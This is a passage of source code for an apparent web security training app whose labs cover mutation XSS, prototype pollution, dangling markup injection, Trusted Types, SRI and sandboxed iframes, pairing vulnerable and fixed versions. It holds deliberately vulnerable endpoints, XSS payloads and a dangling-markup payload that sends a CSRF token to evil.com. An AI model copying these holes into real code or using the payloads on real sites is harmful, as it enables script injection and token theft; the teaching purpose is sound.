        "config.apiUrl = " + JSON.stringify(config.apiUrl) +
        "\\ntype = " + typeof config +
        "\\nfrozen = " + Object.isFrozen(config);
    </script>

    <h3>Try the same payload:</h3>
    <ul>
      <li><a href="/dom-clobbering-fixed?inject=<a id=config href=https://evil.com/api>"><code>&lt;a id=config href=https://evil.com&gt;</code></a> — const shadows the DOM element</li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Fix: use const declaration — shadows any DOM-clobbered global</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const config = Object.freeze({ apiUrl: "https://api.legit.com/v1" });</span>

<span style="color:#6a9955;">// Even if &lt;a id="config"&gt; exists in the DOM,</span>
<span style="color:#6a9955;">// the const declaration takes precedence.</span>
<span style="color:#6a9955;">// Object.freeze() prevents modification after creation.</span>

<span style="color:#dcdcaa;">fetch</span>(config.apiUrl);  <span style="color:#6a9955;">// always "https://api.legit.com/v1"</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">var apiUrl = window.config ? window.config.href : "...";  // clobberable</span>
<span style="color:#89d185;">const config = Object.freeze({ apiUrl: "..." });           // not clobberable</span>

<span style="color:#6a9955;">// Why const works:</span>
<span style="color:#6a9955;">// - const creates a variable in the local scope</span>
<span style="color:#6a9955;">// - Local scope variables shadow window properties</span>
<span style="color:#6a9955;">// - Object.freeze() prevents the object from being modified</span></code></pre>

    <details>
      <summary>Other defenses against DOM Clobbering</summary>
      <p><strong>1.</strong> Use <code>const</code>/<code>let</code> instead of <code>var</code> or <code>window.x</code></p>
      <p><strong>2.</strong> <code>Object.freeze()</code> your config objects</p>
      <p><strong>3.</strong> DOMPurify with <code>SANITIZE_DOM: true</code> strips dangerous id/name attributes</p>
      <p><strong>4.</strong> Don't rely on <code>window.x</code> for security-critical values</p>
    </details>
  `);
});

/* ========================================================================
   LAB 13 — Mutation XSS (mXSS)
   ======================================================================== */

app.get("/mxss", (req, res) => {
  res.type("html").send(`
    <h1>Lab 13: Mutation XSS (mXSS)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The browser's HTML parser "fixes" malformed HTML, sometimes creating XSS
    from input that looks safe to a sanitizer.</p>

    <h3>How mXSS Works</h3>
    <div style="border:2px solid #c00;padding:1rem;border-radius:6px;margin:1rem 0;">
      <p><strong>The problem:</strong> A sanitizer parses HTML, decides it's safe, then outputs it.
      But when the browser re-parses the output, it interprets the HTML differently —
      "mutating" safe content into dangerous content.</p>
    </div>

    <h3>Classic mXSS Example</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Input to sanitizer:</span>
<span style="color:#ce9178;">&lt;svg&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;&lt;/svg&gt;</span>

<span style="color:#6a9955;">// What a regex sanitizer sees:</span>
<span style="color:#6a9955;">// &lt;style&gt; block → its contents are CSS, not HTML</span>
<span style="color:#6a9955;">// &lt;img src=x onerror=alert(1)&gt; is "just CSS text" → looks safe!</span>

<span style="color:#6a9955;">// What the browser does after mutation:</span>
<span style="color:#6a9955;">// In SVG context, &lt;style&gt; content is re-parsed as SVG foreign content</span>
<span style="color:#6a9955;">// The &lt;img&gt; tag becomes a real element</span>
<span style="color:#6a9955;">// onerror fires → XSS!</span></code></pre>

    <h3>Another Example: Backtick Mutation</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Input:</span>
<span style="color:#ce9178;">&lt;div title="x&#96;onclick=alert(1)"&gt;</span>

<span style="color:#6a9955;">// Naive sanitizer:</span>
<span style="color:#6a9955;">// Sees title="x&#96;onclick=alert(1)" as a single attribute → safe</span>

<span style="color:#6a9955;">// IE's HTML parser:</span>
<span style="color:#6a9955;">// Treats &#96; as an attribute delimiter</span>
<span style="color:#6a9955;">// Parses as: title="x" onclick=alert(1) → XSS!</span></code></pre>

    <h3>Why Regex Sanitizers Fail</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Regex approach (DANGEROUS):</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">html.replace(/&lt;script[^&gt;]*&gt;[\\s\\S]*?&lt;\\/script&gt;/gi, "");</span>

<span style="color:#6a9955;">// Problems:</span>
<span style="color:#6a9955;">// 1. HTML is NOT a regular language — regex can't parse it correctly</span>
<span style="color:#6a9955;">// 2. The sanitizer sees one parse tree, the browser sees another</span>
<span style="color:#6a9955;">// 3. Context-dependent parsing (SVG vs HTML vs MathML) isn't handled</span>
<span style="color:#6a9955;">// 4. Browser quirks modes create additional parse differences</span>

<span style="color:#6a9955;">// DOMPurify approach (SAFE):</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">DOMPurify.sanitize(html);</span>

<span style="color:#6a9955;">// DOMPurify parses HTML using the BROWSER'S OWN parser (via DOM API)</span>
<span style="color:#6a9955;">// This ensures the sanitizer sees exactly what the browser will render.</span>
<span style="color:#6a9955;">// No parse differential → no mutation XSS.</span></code></pre>

    <h3>Live Demo: Parse Differential</h3>
    <p>Enter HTML below to see how the browser actually parses it:</p>
    <textarea id="mxss-input" rows="3" cols="60" style="font-family:monospace;">&lt;svg&gt;&lt;style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;&lt;/svg&gt;</textarea>
    <button onclick="showParsed()">Show browser's DOM output</button>
    <pre id="mxss-output" ${PRE}></pre>

    <script>
      function showParsed() {
        var input = document.getElementById("mxss-input").value;
        var div = document.createElement("div");
        div.innerHTML = input;
        document.getElementById("mxss-output").textContent =
          "Input:\\n" + input + "\\n\\nBrowser's DOM (innerHTML):\\n" + div.innerHTML;
      }
    </script>

    <details>
      <summary>Key takeaway</summary>
      <p>mXSS exploits the gap between how a sanitizer parses HTML and how the
      browser parses it. The only reliable defense is to sanitize using the
      browser's own parser — which is exactly what DOMPurify does.</p>
      <p>Never build your own HTML sanitizer with regex. Use DOMPurify.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 14 — Prototype Pollution → XSS
   ======================================================================== */

function unsafeMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      if (!target[key]) target[key] = {};
      unsafeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

function safeMerge(target, source) {
  for (const key in source) {
    if (!Object.prototype.hasOwnProperty.call(source, key)) continue;
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    if (typeof source[key] === "object" && source[key] !== null) {
      if (!target[key]) target[key] = Object.create(null);
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// --- 14a: Vulnerable — prototype pollution via deep merge ---
app.get("/proto-pollution-xss", (req, res) => {
  // Create a fresh object so pollution doesn't persist across requests
  const defaults = { theme: "light", lang: "en" };
  const userSettings = req.query;

  // Deep merge user input into defaults (UNSAFE)
  const tempObj = {};
  unsafeMerge(tempObj, defaults);
  unsafeMerge(tempObj, userSettings);

  // Check if prototype was polluted
  const testObj = {};
  const polluted = testObj.polluted || testObj.innerHTML || "";

  res.type("html").send(`
    <h1>Lab 14a: Prototype Pollution → XSS (Vulnerable)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>This page deep-merges query parameters into a settings object.
    The <code>__proto__</code> key can poison <code>Object.prototype</code>.</p>

    <h3>Current settings:</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(tempObj, null, 2))}</pre>

    <h3>Pollution check:</h3>
    <pre ${PRE}><code>const test = {};
test.polluted = ${escapeHtml(JSON.stringify(testObj.polluted))}  // should be undefined
test.innerHTML = ${escapeHtml(JSON.stringify(testObj.innerHTML))}  // should be undefined</code></pre>
    ${polluted ? `<p style="color:#c00;"><strong>Prototype is polluted!</strong> Empty objects now have unexpected properties.</p>` : `<p style="color:#999;">Prototype not polluted (try the payload below).</p>`}

    <h3>Try these payloads:</h3>
    <ul>
      <li><a class="vuln" href="/proto-pollution?__proto__[polluted]=true"><code>?__proto__[polluted]=true</code></a></li>
      <li><a class="vuln" href="/proto-pollution?__proto__[innerHTML]=<img src=x onerror=alert(1)>"><code>?__proto__[innerHTML]=&lt;img onerror=...&gt;</code></a></li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Unsafe deep merge — doesn't filter __proto__</span>
<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">unsafeMerge</span>(target, source) {
  <span style="color:#c586c0;">for</span> (<span style="color:#9cdcfe;">const</span> key <span style="color:#c586c0;">in</span> source) {
    <span style="color:#c586c0;">if</span> (<span style="color:#c586c0;">typeof</span> source[key] === <span style="color:#ce9178;">"object"</span>) {
      <span style="color:#c586c0;">if</span> (!target[key]) target[key] = {};
      <span style="color:#dcdcaa;">unsafeMerge</span>(target[key], source[key]);
    } <span style="color:#c586c0;">else</span> {
      <span style="background:#5c1a1a;color:#f48771;font-weight:bold;">target[key] = source[key];</span>  <span style="color:#f44747;">// &lt;-- THE BUG</span>
    }
  }
}

<span style="color:#6a9955;">// When key = "__proto__", target[key] = Object.prototype</span>
<span style="color:#6a9955;">// Setting properties on it affects ALL objects:</span>
<span style="color:#6a9955;">//   {}.__proto__.polluted = true</span>
<span style="color:#6a9955;">//   → every new {} now has .polluted === true</span></code></pre>

    <h3>Attack Flow</h3>
    <ol>
      <li>Attacker sends <code>?__proto__[innerHTML]=&lt;img onerror=alert(1)&gt;</code></li>
      <li><code>unsafeMerge</code> traverses into <code>target["__proto__"]</code> = <code>Object.prototype</code></li>
      <li>Sets <code>Object.prototype.innerHTML = "&lt;img onerror=...&gt;"</code></li>
      <li>Later, if code does <code>element.innerHTML = obj.someProperty</code> and <code>someProperty</code> is undefined, it inherits the polluted value from the prototype</li>
      <li>XSS fires</li>
    </ol>

    <details>
      <summary>Why is prototype pollution dangerous?</summary>
      <p>Prototype pollution doesn't directly cause XSS — it sets up a <strong>gadget</strong>
      that triggers XSS later. If any code path reads a property that doesn't exist on
      an object, it falls through to <code>Object.prototype</code> where the attacker's
      payload is waiting.</p>
      <p>This has been found in jQuery, Lodash, and many other popular libraries.</p>
    </details>
  `);
});

// --- 14b: Fixed — safe merge ---
app.get("/proto-pollution-xss-fixed", (req, res) => {
  const defaults = { theme: "light", lang: "en" };
  const userSettings = req.query;

  const config = Object.create(null);
  safeMerge(config, defaults);
  safeMerge(config, userSettings);

  const testObj = {};

  res.type("html").send(`
    <h1>Lab 14b: Prototype Pollution — Fixed</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Safe merge skips <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys.</p>

    <h3>Current settings:</h3>
    <pre ${PRE}>${escapeHtml(JSON.stringify(config, null, 2))}</pre>

    <h3>Pollution check:</h3>
    <pre ${PRE}><code>const test = {};
test.polluted = ${escapeHtml(JSON.stringify(testObj.polluted))}  // undefined — safe!</code></pre>
    <p style="color:#070;"><strong>Prototype is clean.</strong> The <code>__proto__</code> key was filtered.</p>

    <h3>Try the same payload:</h3>
    <ul>
      <li><a href="/proto-pollution-fixed?__proto__[polluted]=true"><code>?__proto__[polluted]=true</code></a> — filtered out</li>
    </ul>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">safeMerge</span>(target, source) {
  <span style="color:#c586c0;">for</span> (<span style="color:#9cdcfe;">const</span> key <span style="color:#c586c0;">in</span> source) {
    <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (!Object.prototype.hasOwnProperty.call(source, key)) continue;</span>
    <span style="background:#1a3a1a;color:#89d185;font-weight:bold;">if (key === "__proto__" || key === "constructor" || key === "prototype") continue;</span>
    <span style="color:#6a9955;">// ... rest of merge</span>
  }
}

<span style="color:#6a9955;">// Also: use Object.create(null) for the target</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">const config = Object.create(null);</span>
<span style="color:#6a9955;">// Object.create(null) has NO prototype — can't be polluted</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#f48771;text-decoration:line-through;">function unsafeMerge(target, source) {        // no key filtering</span>
<span style="color:#f48771;text-decoration:line-through;">  for (const key in source) {                  // iterates ALL keys</span>
<span style="color:#f48771;text-decoration:line-through;">    target[key] = source[key];                 // including __proto__!</span>

<span style="color:#89d185;">function safeMerge(target, source) {</span>
<span style="color:#89d185;">  for (const key in source) {</span>
<span style="color:#89d185;">    if (!source.hasOwnProperty(key)) continue; // skip inherited</span>
<span style="color:#89d185;">    if (key === "__proto__") continue;          // skip dangerous keys</span>
<span style="color:#89d185;">    target[key] = source[key];</span></code></pre>

    <details>
      <summary>Prevention checklist</summary>
      <p><strong>1.</strong> Filter <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> in all merge/clone functions</p>
      <p><strong>2.</strong> Use <code>Object.create(null)</code> for config objects</p>
      <p><strong>3.</strong> Use <code>Map</code> instead of plain objects for user-controlled keys</p>
      <p><strong>4.</strong> <code>Object.freeze(Object.prototype)</code> as a nuclear option (may break libraries)</p>
      <p><strong>5.</strong> Use <code>--frozen-intrinsics</code> flag in Node.js</p>
    </details>
  `);
});

/* ========================================================================
   LAB 15 — Dangling Markup Injection
   ======================================================================== */

app.get("/dangling-markup", (req, res) => {
  const csrfToken = crypto.randomBytes(16).toString("hex");
  const inject = req.query.inject || "";

  res.type("html").send(`
    <h1>Lab 15: Dangling Markup Injection</h1>
    <p><a href="/">Back to labs</a></p>
    <p>Data exfiltration <strong>without JavaScript</strong> — bypasses CSP.</p>

    <div style="border:2px solid #c00;padding:1rem;border-radius:6px;margin:1rem 0;">
      <p><strong>Concept:</strong> An attacker injects an unclosed tag (like <code>&lt;img src="https://evil.com/?</code>)
      that "eats" subsequent page content into its attribute. The browser sends the captured content
      to the attacker's server as part of a resource request.</p>
    </div>

    <h3>Simulated page with CSRF token:</h3>
    <div style="border:1px solid #ccc;padding:1rem;font-family:monospace;font-size:0.9em;">
      <p>Welcome, user!</p>
      <p>Injection point: ${inject}</p>
      <form action="/submit" method="POST">
        <input type="hidden" name="csrf_token" value="${csrfToken}">
        <button type="submit">Submit</button>
      </form>
    </div>

    <h3>Try this payload:</h3>
    <p><a class="vuln" href="/dangling-markup?inject=${encodeURIComponent('<img src="https://evil.com/?stolen=')}"><code>&lt;img src="https://evil.com/?stolen=</code></a> (unclosed quote)</p>

    <h3>What happens:</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// The injected HTML:</span>
<span style="color:#ce9178;">&lt;p&gt;Injection point: &lt;img src="https://evil.com/?stolen=&lt;/p&gt;</span>
<span style="color:#ce9178;">&lt;form action="/submit"&gt;</span>
<span style="color:#ce9178;">  &lt;input type="hidden" name="csrf_token" value="abc123..."&gt;</span>
<span style="color:#ce9178;">  &lt;button&gt;Submit&lt;/button&gt;</span>
<span style="color:#ce9178;">&lt;/form&gt;</span>

<span style="color:#6a9955;">// The browser sees the unclosed src="...</span>
<span style="color:#6a9955;">// It reads forward until it finds the next matching quote</span>
<span style="color:#6a9955;">// Everything between becomes part of the URL:</span>
<span style="color:#f48771;">src="https://evil.com/?stolen=&lt;/p&gt;&lt;form...csrf_token...value=abc123"</span>

<span style="color:#6a9955;">// The browser makes a request to:</span>
<span style="color:#6a9955;">// https://evil.com/?stolen=...csrf_token...value=abc123...</span>
<span style="color:#6a9955;">// The attacker's server receives the CSRF token!</span></code></pre>

    <h3>Why CSP doesn't help:</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// CSP restricts: scripts, styles, frames, etc.</span>
<span style="color:#6a9955;">// CSP does NOT restrict: images (by default)</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// Even with strict CSP:</span>
<span style="color:#6a9955;">//   Content-Security-Policy: script-src 'none'</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// The &lt;img src="https://evil.com/?stolen=..."&gt; still loads!</span>
<span style="color:#6a9955;">// Unless you also set: img-src 'self'</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// Defense: restrict img-src, form-action, and base-uri in CSP</span></code></pre>

    <details>
      <summary>Defenses against dangling markup</summary>
      <p><strong>1.</strong> Escape user input (prevents the injection entirely)</p>
      <p><strong>2.</strong> CSP <code>img-src 'self'</code> — blocks loading images from external origins</p>
      <p><strong>3.</strong> CSP <code>base-uri 'self'</code> — prevents <code>&lt;base&gt;</code> tag injection</p>
      <p><strong>4.</strong> CSP <code>form-action 'self'</code> — prevents form redirect attacks</p>
      <p><strong>5.</strong> Chrome blocks some dangling markup patterns (requests with newlines/&lt; in URLs)</p>
    </details>
  `);
});

/* ========================================================================
   LAB 16 — Trusted Types
   ======================================================================== */

// --- 16a: Enforcing ---
app.get("/trusted-types", (req, res) => {
  res.set("Content-Security-Policy", "require-trusted-types-for 'script'; trusted-types default dompurify");
  res.type("html").send(`
    <h1>Lab 16a: Trusted Types (Enforcing)</h1>
    <p><a href="/">Back to labs</a></p>

    <div style="border:2px solid #070;padding:1rem;border-radius:6px;margin:1rem 0;">
      <p><strong>Chromium only:</strong> Trusted Types are supported in Chrome and Edge.
      Firefox and Safari do not support them yet.</p>
    </div>

    <p>CSP header: <code>require-trusted-types-for 'script'; trusted-types default dompurify</code></p>

    <h3>Test 1: Direct innerHTML (blocked)</h3>
    <div id="output1" style="border:1px solid #ccc;padding:0.5rem;min-height:1.5rem;"></div>
    <p id="status1"></p>

    <h3>Test 2: innerHTML via Trusted Types policy (allowed)</h3>
    <div id="output2" style="border:1px solid #ccc;padding:0.5rem;min-height:1.5rem;"></div>
    <p id="status2"></p>

    <script>
      // Test 1: Direct innerHTML — should throw TypeError
      try {
        document.getElementById("output1").innerHTML = "<b>Hello</b>";
        document.getElementById("status1").innerHTML = '<span style="color:#c00;">innerHTML worked — Trusted Types not enforced (not Chromium?)</span>';
      } catch (e) {
        document.getElementById("status1").textContent = "Blocked: " + e.message;
        document.getElementById("status1").style.color = "#070";
      }

      // Test 2: Use a Trusted Types policy
      try {
        if (typeof trustedTypes !== "undefined") {
          var policy = trustedTypes.createPolicy("default", {
            createHTML: function(s) {
              // In production: return DOMPurify.sanitize(s)
              // For demo: simple strip of script tags
              return s.replace(/<script[^>]*>[\\s\\S]*?<\\/script>/gi, "")
                      .replace(/on\\w+\\s*=\\s*"[^"]*"/gi, "")
                      .replace(/on\\w+\\s*=\\s*'[^']*'/gi, "");
            }
          });
          document.getElementById("output2").innerHTML = policy.createHTML("<b>Hello via Trusted Types!</b> <script>alert('blocked')<\\/script>");
          document.getElementById("status2").innerHTML = '<span style="color:#070;">Trusted Types policy created and used successfully</span>';
        } else {
          document.getElementById("status2").textContent = "trustedTypes API not available (not Chromium?)";
        }
      } catch (e) {
        document.getElementById("status2").textContent = "Error: " + e.message;
      }
    </script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Server: set CSP header to require Trusted Types</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">res.set("Content-Security-Policy",</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">  "require-trusted-types-for 'script'; trusted-types default dompurify");</span>

<span style="color:#6a9955;">// Client: direct innerHTML now throws TypeError</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">element.innerHTML = userInput;</span>  <span style="color:#f44747;">// TypeError: not a TrustedHTML value</span>

<span style="color:#6a9955;">// Client: create a policy that sanitizes</span>
<span style="color:#9cdcfe;">const</span> policy = <span style="color:#4ec9b0;">trustedTypes</span>.<span style="color:#dcdcaa;">createPolicy</span>(<span style="color:#ce9178;">"default"</span>, {
  <span style="color:#dcdcaa;">createHTML</span>: (s) =&gt; <span style="color:#4ec9b0;">DOMPurify</span>.<span style="color:#dcdcaa;">sanitize</span>(s),
});

<span style="color:#6a9955;">// Now use the policy to create trusted HTML:</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">element.innerHTML = policy.createHTML(userInput);</span>  <span style="color:#6a9955;">// works — goes through sanitizer</span></code></pre>

    <h3>How Trusted Types Work</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Without Trusted Types:</span>
<span style="color:#6a9955;">//   element.innerHTML = anyString  → always works, potential XSS</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// With Trusted Types:</span>
<span style="color:#6a9955;">//   element.innerHTML = anyString  → TypeError (blocked!)</span>
<span style="color:#6a9955;">//   element.innerHTML = policy.createHTML(string)  → works (sanitized)</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// The policy is a bottleneck — all HTML must go through it.</span>
<span style="color:#6a9955;">// You only need to audit the policy code, not every innerHTML call.</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// The "default" policy is special — it's used automatically</span>
<span style="color:#6a9955;">// when code tries to assign a string to a dangerous sink.</span></code></pre>

    <details>
      <summary>Why Trusted Types matter</summary>
      <p>Trusted Types are the <strong>"last mile" defense</strong>. Even if your app has
      XSS-vulnerable code, the browser itself prevents the dangerous assignment.</p>
      <p>Google uses Trusted Types internally and has found it highly effective at
      preventing XSS at scale. It shifts the security model from "don't pass dangerous
      values" to "the browser enforces that only sanitized values reach dangerous sinks."</p>
    </details>
  `);
});

// --- 16b: Report-only ---
app.get("/trusted-types-report", (req, res) => {
  res.set("Content-Security-Policy-Report-Only", "require-trusted-types-for 'script'; trusted-types default");
  res.type("html").send(`
    <h1>Lab 16b: Trusted Types (Report-Only)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>CSP header: <code>Content-Security-Policy-Report-Only: require-trusted-types-for 'script'</code></p>

    <div style="border:2px solid #d4a800;padding:1rem;border-radius:6px;margin:1rem 0;">
      <p><strong>Report-only mode:</strong> Violations are logged to the console but not blocked.
      Use this to audit your codebase before enforcing.</p>
    </div>

    <h3>Test: Direct innerHTML (allowed but reported)</h3>
    <div id="output" style="border:1px solid #ccc;padding:0.5rem;min-height:1.5rem;"></div>

    <script>
      document.getElementById("output").innerHTML = "<b>This works</b> but check the console for violation reports.";
    </script>

    <p><em>Open DevTools Console to see Trusted Types violation reports.</em></p>
    <hr>

    <h3>Rollout Strategy</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Step 1: Deploy Report-Only to discover violations</span>
<span style="color:#d7ba7d;">Content-Security-Policy-Report-Only: require-trusted-types-for 'script'</span>

<span style="color:#6a9955;">// Step 2: Create policies for legitimate innerHTML usage</span>
<span style="color:#9cdcfe;">const</span> policy = trustedTypes.createPolicy(<span style="color:#ce9178;">"default"</span>, {
  createHTML: (s) =&gt; DOMPurify.sanitize(s),
});

<span style="color:#6a9955;">// Step 3: Fix all violations (update innerHTML calls to use policy)</span>

<span style="color:#6a9955;">// Step 4: Switch to enforcing</span>
<span style="color:#89d185;">Content-Security-Policy: require-trusted-types-for 'script'</span></code></pre>

    <details>
      <summary>Key takeaway</summary>
      <p>Same pattern as CSP: deploy in report-only first, fix violations, then enforce.
      Trusted Types + DOMPurify is the strongest client-side XSS defense available today.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 17 — Subresource Integrity (SRI)
   ======================================================================== */

// Serve a fake CDN script
const cdnScript = 'document.getElementById("sri-status").textContent = "Analytics script loaded successfully!"; document.getElementById("sri-status").style.color = "#070";';
const cdnScriptHash = crypto.createHash("sha384").update(cdnScript).digest("base64");

app.get("/cdn/analytics.js", (req, res) => {
  res.type("application/javascript").send(cdnScript);
});

// --- 17a: SRI with correct hash ---
app.get("/sri-demo", (req, res) => {
  res.type("html").send(`
    <h1>Lab 17a: Subresource Integrity — Correct Hash (Safe)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The script is loaded with an <code>integrity</code> attribute that matches the file's hash.</p>

    <h3>Script status:</h3>
    <p id="sri-status" style="color:#999;">Loading...</p>

    <script src="/cdn/analytics.js"
            integrity="sha384-${cdnScriptHash}"
            crossorigin="anonymous"></script>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Script loaded with integrity check:</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&lt;script src="/cdn/analytics.js"</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">        integrity="sha384-${escapeHtml(cdnScriptHash)}"</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">        crossorigin="anonymous"&gt;&lt;/script&gt;</span>

<span style="color:#6a9955;">// The browser:</span>
<span style="color:#6a9955;">// 1. Downloads the script</span>
<span style="color:#6a9955;">// 2. Computes SHA-384 hash of the downloaded content</span>
<span style="color:#6a9955;">// 3. Compares it to the integrity attribute</span>
<span style="color:#6a9955;">// 4. If they match → execute the script</span>
<span style="color:#6a9955;">// 5. If they don't match → block the script, log error</span></code></pre>

    <h3>How to generate the hash:</h3>
    <pre ${PRE}><code><span style="color:#6a9955;"># Command line:</span>
openssl dgst -sha384 -binary analytics.js | openssl base64 -A

<span style="color:#6a9955;"># Or in Node.js:</span>
<span style="color:#9cdcfe;">const</span> hash = crypto.<span style="color:#dcdcaa;">createHash</span>(<span style="color:#ce9178;">"sha384"</span>)
  .<span style="color:#dcdcaa;">update</span>(fileContents)
  .<span style="color:#dcdcaa;">digest</span>(<span style="color:#ce9178;">"base64"</span>);
<span style="color:#6a9955;">// Use as: integrity="sha384-{hash}"</span></code></pre>

    <details>
      <summary>Why SRI matters</summary>
      <p>If you load scripts from a CDN (jQuery, analytics, etc.), a compromised CDN
      could serve modified scripts to all your users. SRI ensures the script hasn't
      been tampered with — if even one byte changes, the hash won't match and the
      browser blocks execution.</p>
    </details>
  `);
});

// --- 17b: SRI with wrong hash (tampered) ---
app.get("/sri-tampered", (req, res) => {
  res.type("html").send(`
    <h1>Lab 17b: SRI — Wrong Hash (Blocked)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The script is loaded with a <strong>wrong</strong> integrity hash. The browser blocks it.</p>

    <h3>Script status:</h3>
    <p id="sri-status" style="color:#c00;">Script blocked — integrity check failed</p>

    <script src="/cdn/analytics.js"
            integrity="sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
            crossorigin="anonymous"></script>

    <p><em>Open DevTools Console to see the integrity check error.</em></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Script loaded with WRONG integrity hash:</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">&lt;script src="/cdn/analytics.js"</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">        integrity="sha384-AAAA...AAAA"</span>  <span style="color:#f44747;">// wrong hash!</span>
<span style="background:#5c1a1a;color:#f48771;font-weight:bold;">        crossorigin="anonymous"&gt;&lt;/script&gt;</span>

<span style="color:#6a9955;">// The browser:</span>
<span style="color:#6a9955;">// 1. Downloads the script</span>
<span style="color:#6a9955;">// 2. Computes SHA-384 hash</span>
<span style="color:#6a9955;">// 3. Hash doesn't match → BLOCKS the script</span>
<span style="color:#6a9955;">// 4. Logs error to console</span>
<span style="color:#6a9955;">//</span>
<span style="color:#6a9955;">// This simulates what happens if a CDN is compromised</span>
<span style="color:#6a9955;">// and serves a modified (malicious) script.</span></code></pre>

    <h3>What Changed</h3>
    <pre ${PRE}><code><span style="color:#89d185;">integrity="sha384-${escapeHtml(cdnScriptHash)}"  // correct hash → script runs</span>
<span style="color:#f48771;text-decoration:line-through;">integrity="sha384-AAAA...AAAA"                          // wrong hash → script blocked</span></code></pre>

    <details>
      <summary>SRI + crossorigin</summary>
      <p><code>crossorigin="anonymous"</code> is required for cross-origin SRI.
      Without it, the browser can't compare hashes for cross-origin resources.</p>
      <p>For same-origin scripts (like this demo), <code>crossorigin</code> is optional
      but good practice to include.</p>
    </details>
  `);
});

/* ========================================================================
   LAB 18 — Sandbox Iframes
   ======================================================================== */

// Content page for the iframe
app.get("/iframe-content", (req, res) => {
  res.type("html").send(`
    <html><body style="font-family:system-ui;padding:1rem;background:#f9f9f9;">
    <h3>Iframe Content</h3>

    <p id="script-status" style="color:#999;">JavaScript: checking...</p>
    <script>
      document.getElementById("script-status").textContent = "JavaScript: ENABLED";
      document.getElementById("script-status").style.color = "#070";
    </script>

    <form action="/safe-landing" method="GET">
      <button type="submit">Submit Form</button>
      <span id="form-status"></span>
    </form>

    <button onclick="tryNavigate()">Navigate Parent</button>
    <p id="nav-status"></p>

    <script>
      function tryNavigate() {
        try {
          window.top.location = "/safe-landing";
          document.getElementById("nav-status").textContent = "Navigation: succeeded";
        } catch(e) {
          document.getElementById("nav-status").textContent = "Navigation: BLOCKED — " + e.message;
          document.getElementById("nav-status").style.color = "#c00";
        }
      }
    </script>
    </body></html>
  `);
});

// --- 18a: Sandboxed iframe ---
app.get("/sandbox-iframe", (req, res) => {
  res.type("html").send(`
    <h1>Lab 18a: Sandbox Iframe (Restricted)</h1>
    <p><a href="/">Back to labs</a></p>
    <p>The iframe has <code>sandbox=""</code> — scripts, forms, and navigation are all blocked.</p>

    <h3>Sandboxed iframe:</h3>
    <iframe src="/iframe-content" sandbox=""
            style="border:2px solid #070;width:100%;height:200px;"></iframe>

    <h3>With selective permissions:</h3>
    <iframe src="/iframe-content" sandbox="allow-scripts"
            style="border:2px solid #d4a800;width:100%;height:200px;"></iframe>
    <p><em>Above: <code>sandbox="allow-scripts"</code> — scripts run but forms and navigation still blocked.</em></p>
    <hr>

    <h3>Source Code</h3>
    <pre ${PRE}><code><span style="color:#6a9955;">// Full sandbox — everything restricted</span>
<span style="background:#1a3a1a;color:#89d185;font-weight:bold;">&lt;iframe src="/content" sandbox=""&gt;&lt;/iframe&gt;</span>

<span style="color:#6a9955;">// sandbox="" blocks:</span>
<span style="color:#6a9955;">//   - JavaScript execution</span>
